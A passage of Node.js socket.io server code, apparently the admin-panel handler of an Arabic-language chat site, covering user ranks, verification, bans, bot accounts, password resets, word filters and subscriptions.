                  ip: UserInfo[search.id]["ip"],
                  username: usbr["topic"] + "[" + data["power"] + "]",
                  room: data["power"],
                  time: new Date().getTime(),
                });

                if (usbr["uid"]) {
                  UsersRepo.updateBy({
                    state: "updatePower",
                    uid: usbr["uid"],
                    power: data["power"].split("<").join("&#x3C;"),
                  });
                }

                const inme = OnlineUser.findIndex((x) => x.id == usbr["id"]);
                if (inme != -1) {
                  if (UserInfo[data["id"]]) {
                    UserInfo[data["id"]]["power"] =
                      data["power"];
                  }
                  OnlineUser[inme]["power"] = data["power"];
                  io.emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "u^",
                    data: OnlineUser[inme],
                  });
                }
              }
            });
          }
        } else if (data["cmd"] == "SEND_ADMIN_EDIT_ACCOUNT") {
          if (
            typeof data["user"] != "number" ||
            typeof data["loginG"] != "boolean" ||
            typeof data["verification"] != "boolean" ||
            typeof data["ifedit"] != "boolean"
          ) {
            return;
          } else if (!GetPower2(UserInfo[search.id])["edituser"]) {
            return;
          }

          UsersRepo.getBy({ state: "getByID", idreg: data["user"] }).then(
            function (uid) {
              if (uid) {
                if (
                  GetPower(uid["power"])["rank"] >
                  GetPower2(UserInfo[search.id])["rank"]
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "المستخدم اعلى منك رتبة",
                    user: "",
                  });
                  return;
                }

                if (uid["verification"] != data["verification"]) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: uid["verification"]
                      ? "إلغاء توثيق عضويه"
                      : "توثيق عضويه",
                    user: "",
                  });
                  SaveStats({
                    state: uid["verification"]
                      ? "إلغاء توثيق عضويه"
                      : "توثيق عضويه",
                    topic: UserInfo[search.id]["topic"],
                    ip: UserInfo[search.id]["ip"],
                    username: uid["username"],
                    room: "",
                    time: new Date().getTime(),
                  });
                }
                if (uid["ifedit"] != data["ifedit"]) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: uid["ifedit"]
                    ? "ازالة تصميم العضوية "
                    : " تصميم العضوية ",
                    user: "",
                  });
                  SaveStats({
                    state: uid["ifedit"]
                      ? "ازالة تصميم العضوية "
                      : " تصميم العضوية ",
                    topic: UserInfo[search.id]["topic"],
                    ip: UserInfo[search.id]["ip"],
                    username: uid["username"],
                    room: "",
                    time: new Date().getTime(),
                  });
                }
                if (uid["loginG"] != data["loginG"]) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: uid["loginG"]
                      ? "إلغاء العضوية المميزه"
                      : "عضويه مميزه",
                    user: "",
                  });
                  SaveStats({
                    state: uid["loginG"]
                      ? "إلغاء العضوية المميزه"
                      : "عضويه مميزه",
                    topic: UserInfo[search.id]["topic"],
                    ip: UserInfo[search.id]["ip"],
                    username: uid["username"],
                    room: "",
                    time: new Date().getTime(),
                  });
                }

                UsersRepo.updateBy({
                  state: "updateVerLogin",
                  verification: data["verification"],
                  loginG: data["loginG"],
                  ifedit: data["ifedit"],
                  idreg: data["user"],
                }).then((upd) => {
                  if (upd) {
                    if (UserInfo[uid["id"]]) {
                      UserInfo[uid["id"]]["ifedit"] = data["ifedit"] ? 1 : 0;
                      if (
                        data["verification"] == true &&
                        data["loginG"] == false
                      ) {
                        SendNotification({
                          id: uid["id"],
                          state: "to",
                          topic: "",
                          force: 1,
                          msg: "تم توثيق عضويتك",
                          user: "",
                        });
                      } else if (
                        data["loginG"] == true &&
                        data["verification"] == true &&
                        data["ifedit"] == true
                      ) {
                        SendNotification({
                          id: uid["id"],
                          state: "to",
                          topic: "",
                          force: 1,
                          msg: "تم توثيقك و إعطائك دخول مميز وتصميم عضويتك",
                          user: "",
                        });
                      } else if (
                        data["loginG"] == true &&
                        data["verification"] == false
                      ) {
                        SendNotification({
                          id: uid["id"],
                          state: "to",
                          topic: "",
                          force: 1,
                          msg: "تم اعطائك الدخول المميز",
                          user: "",
                        });
                      }
                    }
                  }
                });
              }
            }
          );
        } else if (data["cmd"] == "SEND_ADMIN_INFO_ACCOUNT") {
          if (typeof data["user"] != "number") {
            return;
          }
          UsersRepo.getBy({ idreg: data["user"], state: "getByID" }).then(
            (res) => {
              if (res) {
                socket.emit("SHWO_PANEL_ADMIN", {
                  cmd: "SEND_ADMIN_INFO_ACCOUNT",
                  data: {
                    user: res["username"],
                    idreg: res["idreg"],
                    power: res["power"],
                    verification: res["verification"],
                    ifedit: res["ifedit"],
                    loginG: res["loginG"],
                  },
                });
              }
            }
          );
        } else if (data["cmd"] == "SEND_ADMIN_DELETE_BAND") {
          if (typeof data["id"] != "number") {
            return;
          } else if (!GetPower2(UserInfo[search.id])["ban"]) {
            return;
          }

          BandRepo.getBy({ state: "getByID", id: data["id"] }).then(
            (getbn) => {
              if (getbn) {
                SaveStats({
                  state: "فك حظر",
                  topic: UserInfo[search.id]["username"],
                  ip: UserInfo[search.id]["ip"],
                  username: getbn["name_band"],
                  room:
                    getbn["device"] ||
                    getbn["ip"] ||
                    getbn["username"] ||
                    getbn["country"],
                  time: new Date().getTime(),
                });
                BandRepo.deleted(data["id"]).then((delband) => {
                  if (delband) {
                    socket.emit("SHWO_PANEL_ADMIN", {
                      cmd: "SEND_ADMIN_DELETE_BAND",
                      data: data["id"],
                    });
					RefreshBand();
                  }
                });
              }
            }
          );
        } else if (data["cmd"] == "SEND_ADMIN_BROWSER_BAND") {
          if (typeof data["browser"] != "object") {
            return;
          } else if (!GetPower2(UserInfo[search.id])["ban"]) {
            return;
          }

          BsbRepo.updateBy({
            state: "updateBrowser",
            browsers: JSON.stringify(data["browser"]),
            id: 1,
          }).then((res) => {
            if (res) {
              RefreshSB();
              SaveStats({
                state: "تعديل حظر",
                topic: UserInfo[search.id]["topic"],
                ip: UserInfo[search.id]["ip"],
                username: UserInfo[search.id]["username"],
                room: "تعديل حظر المتصفحات",
                time: new Date().getTime(),
              });
            }
          });
        } else if (data["cmd"] == "SEND_ADMIN_SYSTEM_BAND") {
          if (typeof data["system"] != "object") {
            return;
          } else if (!GetPower2(UserInfo[search.id])["ban"]) {
            return;
          }

          BsbRepo.updateBy({
            state: "updateSystem",
            systems: JSON.stringify(data["system"]),
            id: 1,
          }).then((res) => {
            if (res) {
              RefreshSB();
              SaveStats({
                state: "تعديل حظر",
                topic: UserInfo[search.id]["topic"],
                ip: UserInfo[search.id]["ip"],
                username: UserInfo[search.id]["username"],
                room: "تعديل حظر الأنظمه",
                time: new Date().getTime(),
              });
            }
          });
        } else if (data["cmd"] == "SEND_ADMIN_BANS_ADD") {
          if (!GetPower2(UserInfo[search.id])["ban"]) {
            return;
          } else if (!data["band"]) {
            return;
          }
          var bnc = {};
          UsersRepo.getBy({
            state: "getByUsername",
            username: data["band"].trim(),
          }).then(function (isuer) {
            if (isuer) {
              bnc = {
                logs: "حظر حساب",
                name_band: isuer["topic"],
                type: " من قبل " + UserInfo[search.id]["username"],
                reponse: "لا يوجد سبب",
                device: "",
                username: isuer["username"],
                ip: "",
                topic: UserInfo[search.id]["topic"],
                myuser: UserInfo[search.id]["username"],
                myip: UserInfo[search.id]["ip"],
                country: "",
              };
              BandUser(bnc);
            } else if (
              ValidateIPaddress(data["band"].trim()) ||
              Number(data["band"].trim().replace(".", ""))
            ) {
              bnc = {
                logs: "حظر اي بي",
                name_band: UserInfo[search.id]["username"],
                type: " من قبل " + UserInfo[search.id]["username"],
                reponse: "لا يوجد سبب",
                device: "",
                username: "",
                ip: data["band"].split("<").join("&#x3C;"),
                topic: UserInfo[search.id]["topic"],
                myuser: UserInfo[search.id]["username"],
                myip: UserInfo[search.id]["ip"],
                country: "",
              };
              BandUser(bnc);
            } else if (data["band"].toUpperCase().trim().length == 2) {
              bnc = {
                logs: "حظر دولة",
                name_band: UserInfo[search.id]["username"],
                type: " من قبل " + UserInfo[search.id]["username"],
                reponse: "لا يوجد سبب",
                device: "",
                username: "",
                ip: "",
                topic: UserInfo[search.id]["topic"],
                myuser: UserInfo[search.id]["username"],
                myip: UserInfo[search.id]["ip"],
                country: data["band"].split("<").join("&#x3C;"),
              };
              BandUser(bnc);
            } else {
              bnc = {
                logs: "حظر جهاز",
                name_band: UserInfo[search.id]["username"],
                type: " من قبل " + UserInfo[search.id]["username"],
                reponse: "لا يوجد سبب",
                device: data["band"].split("<").join("&#x3C;"),
                username: "",
                ip: "",
                topic: UserInfo[search.id]["topic"],
                myuser: UserInfo[search.id]["username"],
                myip: UserInfo[search.id]["ip"],
                country: "",
              };
              BandUser(bnc);
            }
          });
        } else if (data["cmd"] == "SEND_ADMIN_BANS") {
          if (!GetPower2(UserInfo[search.id])["ban"]) {
            return;
          }

          BandRepo.getBy({ limit: data["limit"], state: "getAll" }).then(
            (res) => {
              socket.emit("SHWO_PANEL_ADMIN", {
                cmd: "SEND_ADMIN_BANS",
                data: res,
              });
            }
          );

         
          BsbRepo.getAll().then((res) => {
            socket.emit("SHWO_PANEL_ADMIN", {
              cmd: "SEND_ADMIN_BANS_SYSTEM",
              data: res,
            });
          });
        } else if (data["cmd"] == "SEND_ADMIN_ENTER_BOTS") {
          if (!GetPower2(UserInfo[search.id])["edituser"]) {
            return;
          } else if (typeof data["id"] != "string") {
            return;
          }

          BotsRepo.getBy({ state: "getByID", id: data["id"] }).then(
            (login) => {
              if (login) {
                const isdos = OnlineUser.findIndex(
                  (x) => x.id == login["id"]
                );
                if (isdos == -1) {
                  EnterUserGust({
                    power: login["power"],
                    eva: 0,
                    stat: login["stat"],
                    loginG: false,
                    islogin: "بوت",
                    refr: "*",
                    username: login["topic"].split("<").join("&#x3C;"),
                    ucol: login["ucol"].split("<").join("&#x3C;"),
                    mcol: "#000000",
                    mscol: login["mcol"].split("<").join("&#x3C;"),
                    bg: login["bg"].split("<").join("&#x3C;"),
                    rep: login["likebot"],
                    ico: "",
                    islike: [],
                    idreg: "#" + getRandomInt(1, 100),
                    topic: login["topic"].split("<").join("&#x3C;"),
                    country: login["country"] || "tn",
                    ip: login["ip"],
                    lid: stringGen(31),
                    uid: "",
                    token: stringGen(177),
                    id: login["id"],
                    islog: false,
                    ismuted: false,
                    ismutedbc: false,
                    verification: false,
                    device: "BOTS_HOST_BY_MOBAIL_HOST",
                    pic: login["pic"],
                    idroom: login["room"],
                    youtube: '',
                    msg: login["msg"].split("<").join("&#x3C;"),
                    stealth: false,
                  });

                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "تم إدخال البوت",
                    user: "",
                  });
                } else {
                  UserDisconnect({ id: OnlineUser[isdos]["id"], state: 2 });
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "تم إخراج البوت",
                    user: "",
                  });
                }
              }
            }
          );
        } else if (data["cmd"] == "SEND_ADMIN_MSG_BOTS") {
          if (!GetPower2(UserInfo[search.id])["edituser"]) {
            return;
          } else if (
            typeof data["msg"] != "string" ||
            typeof data["id"] != "string"
          ) {
            return;
          }

          if (UserInfo[data["id"]]) {
            io.to(UserInfo[data["id"]]["idroom"]).emit(
              "SEND_EVENT_EMIT_SERVER",
              {
                cmd: "msg",
                data: {
                  bg: UserInfo[data["id"]]["bg"],
                  mi: stringGen(10),
                  mcol: UserInfo[data["id"]]["mcol"],
                  uid: UserInfo[data["id"]]["id"],
                  msg: ReplaceEktisar(data["msg"]).slice(
                    0,
                    SiteSetting["lengthroom"]
                  ),
                  pic: UserInfo[data["id"]]["pic"],
                  topic: UserInfo[data["id"]]["topic"]
                    .split("<")
                    .join("&#x3C;"),
                  ucol: UserInfo[data["id"]]["ucol"],
                },
              }
            );
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "تم إرسال رسالة",
              user: "",
            });
          }
        } else if (data["cmd"] == "SEND_ADMIN_REMOVE_BOTS") {
          if (!GetPower2(UserInfo[search.id])["edituser"]) {
            return;
          } else if (typeof data["id"] != "string") {
            return;
          }
          if (UserInfo[data["id"]]) {
            UserDisconnect({ id: data["id"], state: 2 });
          }
          BotsRepo.deleteByID(data["id"]).then(function (btfl) {
            if (btfl) {
              socket.emit("SHWO_PANEL_ADMIN", {
                cmd: "SEND_ADMIN_REMOVE_BOTS",
                data: data["id"],
              });
              for (var i = 0; i < botsauto.length; i++) {
                if (botsauto[i].id == data["id"]) {
                  botsauto.splice(i, 1);
                    break;
                }
            }
            }
          });
        } else if (data["cmd"] == "SEND_ADMIN_ADD_BOTS") {
          if (!GetPower2(UserInfo[search.id])["edituser"]) {
            return;
          } else if (
            typeof data["data"]["statsbots"] != "number" &&
            typeof data["data"]["likebot"] != "number"
          ) {
            return;
          } else if (
            typeof data["data"]["countrybot"] != "string" ||
            typeof data["data"]["nameb"] != "string" ||
            typeof data["data"]["msgbot"] != "string" ||
            typeof data["data"]["urlpic"] != "string" ||
            typeof data["data"]["rankbot"] != "string"
          ) {
            return;
          }

          const isdos = OnlineUser.findIndex(
            (x) => x.topic == data["data"]["nameb"]
          );
          if (isdos != -1) {
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "اسم البوت موجود في الدردشة",
              user: "",
            });
            return;
          }

          const bots = {
            id: stringGen(30),
            ip:
              randomNumber(1, 100) +
              "." +
              randomNumber(1, 100) +
              "." +
              randomNumber(1, 100) +
              "." +
              randomNumber(1, 100),
            msg: data["data"]["msgbot"],
            pic:
              data["data"]["urlpic"] ||
              "/site/pic.png?z" + getRandomInt(1, 100),
            power: data["data"]["rankbot"] || "",
            country: data["data"]["countrybot"] || "tn",
            room: data["data"]["rommbot"] || "",
            stat: data["data"]["statsbots"] || 0,
            likebot: data["data"]["likebot"] || 0,
            bg: data["data"]["botnamec"],
            ucol: data["data"]["botnamebc"],
            mcol: data["data"]["botmsgc"],
            timestart: data["data"]["timestart"],
            timestop: data["data"]["timestop"],
            autostart: data["data"]["autostart"],
            topic: data["data"]["nameb"].split("<").join("&#x3C;"),
          };
          BotsRepo.getall().then(function(seo){
if(seo){
  if(seo.length >= Config.maxbot){
    SendNotification({
      state: "me",
      topic: "",
      force: 1,
      msg: "تم استنزاف جميع رصيد البوتات",
      user: "",
    });
    return;
  }else{
    BotsRepo.create(bots).then(function (btts) {
      if (btts) {
        socket.emit("SHWO_PANEL_ADMIN", {
          cmd: "SEND_ADMIN_ADD_BOTS",
          data: bots,
        });
        BotsRepo.getBy({ state: "getByID", id: bots.id }).then(
          (login) => {
            if (login) {
              if(login.autostart == 1){
                botsauto.push(login)
                loginbot(login);
              }
            }
          });
      }
    });

  }
}
          });
          
        } else if (data["cmd"] == "SEND_ADMIN_GUST") {
          if (!GetPower2(UserInfo[search.id])["edituser"]) {
            return;
          }
          BotsRepo.getall().then(
            (res) => {
              socket.emit("SHWO_PANEL_ADMIN", {
                cmd: "SEND_ADMIN_GUST_length",
                data: {max:Config.maxbot,all:res.length},
              });
            }
          );
          BotsRepo.getBy({ limit: data["limit"], state: "getAll" }).then(
            (res) => {
              socket.emit("SHWO_PANEL_ADMIN", {
                cmd: "SEND_ADMIN_GUST",
                data: res,
              });
            }
          );
        } else if (data["cmd"] == "SEND_ADMIN_USERS") {
          if (!GetPower2(UserInfo[search.id])["edituser"]) {
            return;
          }
          if (data["value"]) {
            UsersRepo.getBy({
              limit: 5,
              state: "getByAllSearch",
              value: data["value"],
            }).then((res) => {
              socket.emit("SHWO_PANEL_ADMIN", {
                cmd: "SEND_ADMIN_USERS",
                data: res,
              });
            });
          } else {
            UsersRepo.getBy({ limit: data["limit"], state: "getByAll" }).then(
              (res) => {
                socket.emit("SHWO_PANEL_ADMIN", {
                  cmd: "SEND_ADMIN_USERS",
                  data: res,
                });
              }
            );
          }
        } else if (data["cmd"] == "SEND_ADMIN_STATS") {
          if (!GetPower2(UserInfo[search.id])["cp"]) {
            return;
          }
          StateRepo.getAll(data["limit"]).then((res) => {
            socket.emit("SHWO_PANEL_ADMIN", {
              cmd: "SEND_ADMIN_STATS",
              data: res,
            });
          });
        }else if (data["cmd"] == "SEND_ADMIN_report") {
          if (!GetPower2(UserInfo[search.id])["report"]) {
            return;
          }
      

          MesgRepo.getAll(data["limit"]).then((res) => {
            socket.emit("SHWO_PANEL_ADMIN", {
              cmd: "SEND_ADMIN_report",
              data: res,
            });
          
          });
        } else if (data["cmd"] == "SEND_ADMIN_DELETE_ACCOUNT") {
          if (!GetPower2(UserInfo[search.id])["edituser"]) {
            return;
          } else if (typeof data["user"] != "number") {
            return;
          }

          UsersRepo.getBy({ state: "getByID", idreg: data["user"] }).then(
            function (uid) {
              if (uid) {
                if (
                  GetPower(uid["power"])["rank"] >
                  GetPower2(UserInfo[search.id])["rank"]
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "المستخدم اعلى منك رتبة",
                    user: "",
                  });
                  return;
                }
                if (uid["id"] && UserInfo[uid["id"]]) {
                  MessagesList({
                    state: "LogsMsg",
                    bg: "none",
                    copic: "none",
                    class: "hmsg",
                    id: uid.id,
                    topic: uid["topic"],
                    msg: "( حذف عضويه )",
                    room: UserInfo[uid["id"]]["idroom"],
                    pic: uid["pic"],
                  });
                  UserInfo[uid["id"]]["ismsg"] = true;
                  socket.to(uid["id"]).emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "ev",
                    data: 'window.onbeforeunload = null; location.href="/";',
                  });
                  UserDisconnect({ id: uid["id"], state: 2 });
                }
                SubRepo.deleted(uid["username"]);
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "تم حذف العضوية",
                  user: "",
                });
                setTimeout(() => {
                  UsersRepo.deleted(data["user"]).then((delreg) => {
                    if (delreg) {
                      socket.emit("SHWO_PANEL_ADMIN", {
                        cmd: "SEND_ADMIN_DELETE_ACCOUNT",
                        data: uid["username"],
                      });
                      SaveStats({
                        state: "حذف عضويه",
                        topic: UserInfo[search.id]["topic"],
                        ip: UserInfo[search.id]["ip"],
                        username: uid["username"],
                        room: "",
                        time: new Date().getTime(),
                      });
                    }
                  });
                }, 500);
              }
            }
          );
        } else if (data["cmd"] == "SEND_ADMIN_PASS") {
          if (
            typeof data["pass"] != "string" &&
            typeof data["user"] != "number"
          ) {
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "الرجاء التاكد من كلمة المرور",
              user: "",
            });
            return;
          } else if (!data["pass"].trim() || data["pass"].trim().length < 3) {
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "الرجاء التاكد من كلمة المرور",
              user: "",
            });
            return;
          } else if (!GetPower2(UserInfo[search.id])["edituser"]) {
            return;
          }
          UsersRepo.getBy({ state: "getByID", idreg: data["user"] }).then(
            function (uid) {
              if (uid) {
                if (
                  GetPower(uid["power"])["rank"] >
                  GetPower2(UserInfo[search.id])["rank"]
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "المستخدم اعلى منك رتبة",
                    user: "",
                  });
                  return;
                }
                UsersRepo.updateBy({
                  state: "updatePass",
                  password: passwordHash.generate(data["pass"]),
                  idreg: data["user"],
                }).then((uppass) => {
                  if (uppass) {
                    SendNotification({
                      state: "me",
                      topic: "",
                      force: 1,
                      msg: "تم تعديل كلمة المرور",
                      user: "",
                    });
                    SaveStats({
                      state: "تعديل كلمة السر",
                      topic: UserInfo[search.id]["topic"],
                      ip: UserInfo[search.id]["ip"],
                      username: uid["username"],
                      room: "",
                      time: new Date().getTime(),
                    });
                    SendNotification({
                      id: uid["id"],
                      state: "to",
                      topic: "",
                      force: 1,
                      msg: "تم تغير كلمه المرور الخاصه بك",
                      user: "",
                    });
                  }
                });
              }
            }
          );
        } else if (data["cmd"] == "SEND_ADMIN_CHECK") {
          if (!GetPower2(UserInfo[search.id])["edituser"]) {
            return;
          }
          if (typeof data["user"] == "string") {
            UsersRepo.getBy({
              state: "getByUsername",
              username: data["user"],
            }).then(function (uid) {
              if (uid) {
                UsersRepo.updateBy({
                  state: "updateVer",
                  verification: true,
                  username: data["user"],
                }).then((upd) => {
                  if (upd) {
                    SendNotification({
                      state: "me",
                      topic: "",
                      force: 1,
                      msg: "تم توثيق العضوية",
                      user: "",
                    });
                    SaveStats({
                      state: "توثيق عضويه",
                      topic: UserInfo[search.id]["topic"],
                      ip: UserInfo[search.id]["ip"],
                      username: data["user"],
                      room: "",
                      time: new Date().getTime(),
                    });
                  }
                });
              } else {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "تم توثيق تسجيل العضو",
                  user: "",
                });
                SaveStats({
                  state: "توثيق تسجيل",
                  topic: UserInfo[search.id]["topic"],
                  ip: UserInfo[search.id]["ip"],
                  username: data["user"],
                  room: "",
                  time: new Date().getTime(),
                });
                UserChecked.push(data["ip"]);
              }
            });
          }
        } else if (data["cmd"] == "SEND_ADMIN_DELETE_MESSAGE") {
          if (!GetPower2(UserInfo[search.id])["msgs"]) {
            return;
          } else if (typeof data["id"] != "number") {
            return;
          }

          IntroRepo.getBy({ state: "getByID", id: data["id"] }).then(
            (doneis) => {
              if (doneis) {
                const typm = doneis["type"];
                IntroRepo.deleteByID(data["id"]).then((deldone) => {
                  socket.emit("SHWO_PANEL_ADMIN", {
                    cmd: "SEND_ADMIN_DELETE_MESSAGE",
                    data: data["id"],
                  });
                  if (deldone) {
                    SaveStats({
                      state:
                        typm == "d" ? "مسح رسالة يوميه" : "مسح رسالة ترحيب",
                      topic: UserInfo[search.id]["topic"],
                      ip: UserInfo[search.id]["ip"],
                      username: UserInfo[search.id]["username"],
                      room: "",
                      time: new Date().getTime(),
                    });
                  }
                });
              }
            }
          );
        } else if (data["cmd"] == "SEND_ADMIN_ADD_MESSAGE") {
          if (!GetPower2(UserInfo[search.id])["msgs"]) {
            return;
          } else if (
            typeof data["msg"] != "string" ||
            typeof data["type"] != "string" ||
            typeof data["t"] != "string"
          ) {
            return;
          }
          IntroRepo.create({
            category: data["type"].split("<").join("&#x3C;"),
            adresse: data["t"].split("<").join("&#x3C;"),
            msg: data["msg"].split("<").join("&#x3C;"),
          }).then((done) => {
            if (done) {
              IntroRepo.getBy({ state: "getByID", id: done["id"] }).then(
                (doneis) => {
                  if (doneis) {
                    socket.emit("SHWO_PANEL_ADMIN", {
                      cmd: "SEND_ADMIN_ADD_MESSAGE",
                      data: doneis,
                    });
                  }
                }
              );
              SaveStats({
                state:
                  data["type"] == "d"
                    ? "إظافة رسالة يوميه"
                    : "إظافة رسالة ترحيب",
                topic: UserInfo[search.id]["topic"],
                ip: UserInfo[search.id]["ip"],
                username: UserInfo[search.id]["username"],
                room: "",
                time: new Date().getTime(),
              });
            }
          });
        } else if (data["cmd"] == "SEND_ADMIN_MESSAGES") {
          if (!GetPower2(UserInfo[search.id])["msgs"]) {
            return;
          }

          IntroRepo.getBy({ state: "getAll", limit: data["limit"] }).then(
            (res) => {
              socket.emit("SHWO_PANEL_ADMIN", {
                cmd: "SEND_ADMIN_MESSAGES",
                data: res,
              });
            }
          );
        } else if (data["cmd"] == "SEND_ADMIN_ADD_SHORT") {
          if (!GetPower2(UserInfo[search.id])["shrt"]) {
            return;
          } else if (
            typeof data["msg"] != "string" ||
            typeof data["reponse"] != "string"
          ) {
            return;
          }

          CutsRepo.create({
            msg: data["msg"].split("<").join("&#x3C;"),
            reponse: data["reponse"].split("<").join("&#x3C;"),
          }).then((done) => {
            if (done) {
              SaveStats({
                state: "إظافة إختصار",
                topic: UserInfo[search.id]["username"],
                ip: UserInfo[search.id]["ip"],
                username: data["msg"],
                room: "",
                time: new Date().getTime(),
              });
              RefreshEktisar();
              CutsRepo.getBy({ state: "getByID", id: done["id"] }).then(
                (doneis) => {
                  if (doneis) {
                    socket.emit("SHWO_PANEL_ADMIN", {
                      cmd: "SEND_ADMIN_ADD_SHORT",
                      data: doneis,
                    });
                  }
                }
              );
            }
          });
        } else if (data["cmd"] == "SEND_ADMIN_DELETE_SHORT") {
          if (!GetPower2(UserInfo[search.id])["shrt"]) {
            return;
          } else if (typeof data["id"] != "number") {
            return;
          }

          CutsRepo.getBy({ state: "getByID", id: data["id"] }).then(
            (cutr) => {
              if (cutr) {
                SaveStats({
                  state: "مسح إختصار",
                  topic: UserInfo[search.id]["username"],
                  ip: UserInfo[search.id]["ip"],
                  username: cutr["msg"],
                  room: cutr["reponse"],
                  time: new Date().getTime(),
                });
              }
            }
          );
          CutsRepo.deleted(data["id"]).then((deldone) => {
            if (deldone) {
              socket.emit("SHWO_PANEL_ADMIN", {
                cmd: "SEND_ADMIN_DELETE_SHORT",
                data: data["id"],
              });
              RefreshEktisar();
            }
          });
        } else if (data["cmd"] == "SEND_ADMIN_SHORT") {
          if (!GetPower2(UserInfo[search.id])["shrt"]) {
            return;
          }
          CutsRepo.getAllBy(data["limit"]).then((res) => {
            socket.emit("SHWO_PANEL_ADMIN", {
              cmd: "SEND_ADMIN_SHORT",
              data: res,
            });
          });
        } else if (data["cmd"] == "SEND_ADMIN_DELETE_SUB") {
          if (!GetPower2(UserInfo[search.id])["subs"]) {
              return;
          } else if (typeof data["id"] != "number") {
              return;
          }
      
          SubRepo.getBy({ state: "getByID", id: data["id"] }).then((res) => {
            if (res) {
                UsersRepo.getBy({
                    state: "getByUsername",
                    username: res["username"],
                }).then(function (uid) {
                    if (uid) {
                        if (
                            GetPower2(UserInfo[search.id])["rank"] <
                            GetPower(uid["power"])["rank"]
                        ) {
                            SendNotification({
                                state: "me",
                                topic: "",
                                force: 1,
                                msg: "لا يمكنك حذف اشتراك أعلى من اشتراكك",
                                user: "",
                            });
                            return;
                        }
        
                        if (
                            GetPower2(UserInfo[search.id])["rank"] >=
                            GetPower(uid["power"])["rank"]
                        ) {
                            UsersRepo.updateBy({
                                state: "updatePower",
                                power: "",
                                uid: uid["uid"],
                            });
                            if (uid["id"]) {
                                socket.to(uid["id"]).emit("SEND_EVENT_EMIT_SERVER", {
                                    cmd: "power",
                                    data: Config.PowerNon,
                                });
                            }
                        } else {
                            SendNotification({
                                state: "me",
                                topic: "",
                                force: 1,
                                msg: "لا يمكنك حذف اشتراك أعلى من اشتراكك",
                                user: "",
                            });
                            return;
                        }
        
                        SaveStats({
                            state: "مسح إشتراك",
                            topic: UserInfo[search.id]["username"],
                            ip: UserInfo[search.id]["ip"],
                            username: res["username"],
                            room: res["sub"],
                            time: new Date().getTime(),
                        });
        
                        if (
                            GetPower2(UserInfo[search.id])["rank"] >=
                            GetPower(uid["power"])["rank"]
                        ) {
                            SubRepo.deleted(res["username"]);
                        }
        
                        socket.emit("SHWO_PANEL_ADMIN", {
                            cmd: "SEND_ADMIN_DELETE_SUB",
                            data: data["id"],
                        });
                    }
                });
            }
        });                
      } else if (data["cmd"] == "SEND_ADMIN_SUBS") {
          if (!GetPower2(UserInfo[search.id])["subs"]) {
              return;
          }
      
          SubRepo.getBy({ state: "getAll", limit: data["limit"] }).then((res) => {
              socket.emit("SHWO_PANEL_ADMIN", {
                  cmd: "SEND_ADMIN_SUBS",
                  data: res,
              });
          });        
        } else if (data["cmd"] == "SEND_ADMIN_ADD_FILTER") {
          if (!GetPower2(UserInfo[search.id])["subs"]) {
            return;
          } else if (
            typeof data["path"] != "string" ||
            typeof data["v"] != "string"
          ) {
            return;
          } else if (data["v"].includes("*")) {
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "(*) غير مسموحه",
              user: "",
            });
            return;
          }

          NotextRepo.create({
            type: data["path"] == "bmsgs" ? "كلمة ممنوعه" : "كلمة مراقبة",
            path: data["path"].split("<").join("&#x3C;"),
            v: data["v"].split("<").join("&#x3C;"),
          }).then((done) => {
            if (done) {
              SaveStats({
                state:
                  data["path"] == "bmsgs"
                    ? "ممنوعه" + " إظافة كلمة "
                    : "مراقبه" + " إظافة كلمة ",
                topic: UserInfo[search.id]["topic"],
                ip: UserInfo[search.id]["ip"],
                username: UserInfo[search.id]["username"],
                room: data["v"],
                time: new Date().getTime(),
              });
              RefreshNoText();
              socket.emit("SHWO_PANEL_ADMIN", {
                cmd: "SEND_ADMIN_ADD_FILTER",
                data: {
                  id: done["id"],
                  type:
                    data["path"] == "bmsgs" ? "كلمة ممنوعه" : "كلمة مراقبة",
                  path: data["path"].split("<").join("&#x3C;"),
                  v: data["v"].split("<").join("&#x3C;"),
                },
              });
            }
          });
        } else if (data["cmd"] == "SEND_ADMIN_DELETE_FILTER") {
          if (!GetPower2(UserInfo[search.id])["subs"]) {
            return;
          } else if (
            typeof data["id"] != "number" ||
            typeof data["v"] != "string"
          ) {
            return;
          }

          NotextRepo.deleted(data["id"]).then((deldone) => {
            if (deldone) {
              SaveStats({
                state: "مسح فلتر",
                topic: UserInfo[search.id]["topic"],
                ip: UserInfo[search.id]["ip"],
                username: UserInfo[search.id]["username"],
                room: data["v"],
                time: new Date().getTime(),
              });
              RefreshNoText();
              socket.emit("SHWO_PANEL_ADMIN", {
                cmd: "SEND_ADMIN_DELETE_FILTER",
                data: data["id"],
              });
            }
          });
        } else if (data["cmd"] == "SEND_ADMIN_FILTER") {
          if (!GetPower2(UserInfo[search.id])["flter"]) {
            return;
          }
          NotextRepo.getAllBy(data["limit"]).then((res) => {
            HistLetterRepo.getBy({ state: "getAll" }).then((type) => {
              socket.emit("SHWO_PANEL_ADMIN", {
                cmd: "SEND_ADMIN_FILTER",
                data: res,
                type: type,
              });
            });
          });
        } else if (data["cmd"] == "SEND_ADMIN_ROOM_CHECK") {
          if (!GetPower2(UserInfo[search.id])["rooms"]) {
            return;
          } else if (typeof data["id"] != "string") {
            return;
          }
          RoomsRepo.getBy({ state: "getByID", id: data["id"] }).then(
            (isroo) => {
              if (isroo) {
                SettingRepo.updateBy({
                  state: "updateroom",
                  room: data["id"],
                  id: 1,
                });
                socket.emit("SHWO_PANEL_ADMIN", {
                  cmd: "SEND_ADMIN_ROOM_CHECK",
                  data: data["id"],
                });
                SiteSetting["room"] = data["id"];
              }
